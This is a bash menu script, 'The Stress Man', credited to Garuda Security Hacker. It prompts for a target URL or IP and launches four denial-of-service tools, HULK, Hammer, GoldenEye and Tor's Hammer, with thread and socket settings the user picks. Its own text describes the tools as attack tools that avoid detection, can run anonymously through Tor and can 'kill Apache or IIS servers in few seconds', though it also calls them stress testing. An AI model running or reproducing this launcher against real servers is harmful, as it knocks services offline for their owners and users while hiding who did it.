#!/bin/bash
lagi='y'
while [ $lagi == 'y' ] || [ $lagi == 'Y' ];
do
clear
echo -e "\e[92m";
echo ""
echo "@@@@@@   @@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@    @@@@@@  " 
echo "@@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  " 
echo "!@@         @@!    @@!  @@@  @@!       !@@       !@@       "
echo "!@!         !@!    !@!  @!@  !@!       !@!       !@!       "
echo "!!@@!!      @!!    @!@!!@!   @!!!:!    !!@@!!    !!@@!!    "
echo " !!@!!!     !!!    !!@!@!    !!!!!:     !!@!!!    !!@!!!   "
echo "     !:!    !!:    !!: :!!   !!:            !:!       !:!  "
echo "    !:!     :!:    :!:  !:!  :!:           !:!       !:!   "
echo ":::: ::      ::    ::   :::   :: ::::  :::: ::   :::: ::   "
echo ":: : :       :      :   : :  : :: ::   :: : :    :: : :    "
echo "                                                          "
echo  -e "     \e[92m                                                     "
echo "            @@@@@@@@@@    @@@@@@   @@@  @@@  "
echo "            @@@@@@@@@@@  @@@@@@@@  @@@@ @@@  "
echo "            @@! @@! @@!  @@!  @@@  @@!@!@@@  "
echo "            !@! !@! !@!  !@!  @!@  !@!!@!@!  "
echo "            @!! !!@ @!@  @!@!@!@!  @!@ !!@!  "
echo "            !@!   ! !@!  !!!@!!!!  !@!  !!!  "
echo "            !!:     !!:  !!:  !!!  !!:  !!!  "
echo "            :!:     :!:  :!:  !:!  :!:  !:!  "
echo "            :::     ::   ::   :::   ::   ::  "
echo "             :      :     :   : :  ::    :  "
echo ""
echo -e "\e[92m Garuda Security Hacker \e[36m The Coders Team"
echo -e " \e[92mThe Stress Man \e[36mIs An Ultimate Stress Testing Attack Toolz"
echo -e " \e[92mCoded by Yukinoshita 47 \e[36mCodename : Orang Gila"
echo ""
echo -e " \e[35m http://garudasecurityhacker.org"
echo ""
echo -e " \e[37m You Allow It To Develop This Toolz "
echo -e " \e[37m But Don't Remove Original Copyright"
echo ""
echo -e "\e[36m========================================================";
echo ""
echo -e "\e[92m 1. HULK \e[36m[Webserver Stress Testing]";
echo -e "\e[92m 2. Hammer \e[36m[Webserver Stress Testing]";
echo -e "\e[92m 3. Goldeneye \e[36m[DoS Attack]"
echo -e "\e[92m 4. Tor Hammer \e[36m[Anonymized Web Server Killer]";
echo ""
echo -e "\e[36m=====================================================";
read -p " Your Choice [1-4] 69 For Exit :" pil;
echo "=====================================================";
case $pil in
1)
echo "HULK is another nice DOS attacking tool that generates a unique request" 
echo "for each and every generated request to obfuscated traffic at a web server." 
echo "This tool uses many other techniques to avoid attack detection via known patterns."
echo ""
echo "Select your URL Target ex: http://target.com"
read TARGETHULK
python modules/hulk.py http://$TARGETHULK
;;
2)
echo "Hammer is a very nice webserver stress testing tools"
echo "So Let's Start It"
echo ""
echo "Select your target server ip ex: 127.0.0.1"
echo ""
read TARGETHAMMER
echo ""
echo "Select your target port ex: 80"
echo ""
read TARGETHAMMER2
echo ""
echo "Select your turbo speed :p ex: 666"
echo ""
read TARGETHAMMER3
python3 modules/hammer.py -s $TARGETHAMMER -p $TARGETHAMMER2 -t $TARGETHAMMER3
;;
3)
echo "GoldenEye is also a simple but effective DOS attacking tool. "
echo "It was developed in Python for testing DOS attacks, "
echo "but people also use it as hacking tool"
echo "So Let's Start It"
echo ""
echo "Select your target server url ex: http://site.com"
echo ""
read TARGETGE1
echo ""
echo "Number of concurrent workers default 50"
echo ""
read TARGETGE2
echo ""
echo "Number of concurrent sockets default 30"
echo ""
read TARGETGE3
echo ""
echo "HTTP Method to use 'get' or 'post'  or 'random' (default: get)"
echo ""
read TARGETGE4
python modules/goldeneye.py http://$TARGETGE1 -w $TARGETGE2 -s $TARGETGE3 -m $TARGETGE4
;;
4)
echo ""
echo "Tor’s Hammer is another nice DOS testing tool. "
echo "It is a slow post tool written in Python. "
echo "This tool has an extra advantage: It can be run through a TOR network "
echo "to be anonymous while performing the attack. "
echo "It is an effective tool that can kill Apache or IIS servers in few seconds."
echo "So Let's Start It"
echo ""
echo "Select your target IP Server hostname ex: 127.0.0.1"
echo ""
read TARGETTH1
echo ""
echo "Number of threads default 256"
echo ""
read TARGETTH2
echo ""
python modules/torshammer.py -t $TARGETTH1 -r $TARGETTH2
;;
69)
exit 0
;;
*)
echo "Sorry, Not Available"
exit 1
;;
esac
echo -n "Back To Main Menu(y/n) :";
read lagi;
done
